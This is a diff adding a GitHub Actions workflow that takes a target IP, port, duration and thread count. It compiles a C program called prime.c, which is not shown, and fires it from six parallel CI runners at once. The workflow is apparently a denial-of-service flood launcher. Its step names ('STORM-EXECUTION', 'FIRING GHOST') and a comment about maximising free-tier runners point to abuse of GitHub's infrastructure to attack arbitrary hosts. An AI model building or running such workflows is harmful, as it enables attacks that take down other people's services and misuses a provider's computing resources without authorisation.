@@ -1,0 +1,40 @@
+name: ⚔️ SYSTEM-SYNC-v6.5 ⚔️
+
+on:
+  workflow_dispatch:
+    inputs:
+      host:
+        description: 'TARGET IP'
+        required: true
+      port:
+        description: 'TARGET PORT'
+        required: true
+      time:
+        description: 'DURATION (SEC)'
+        required: true
+      threads: 
+        description: 'THREADS'
+        required: true
+
+jobs:
+  STORM-EXECUTION:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      # ⚠️ Max 6 Concurrent Jobs per account for Free Tier efficiency
+      max-parallel: 6 
+      matrix:
+        node: [1, 2, 3, 4, 5, 6] 
+    steps:
+      - name: 🛰️ INITIALIZING
+        uses: actions/checkout@v4
+
+      - name: 🔥 FIRING GHOST v6.5
+        run: |
+          # Compilation with -O3 (Maximum Speed Optimization)
+          gcc -O3 prime.c -o PRIME -lpthread
+          chmod +x PRIME
+          
+          # Execute with bot inputs (IP PORT TIME THREADS)
+          ./PRIME ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
+          
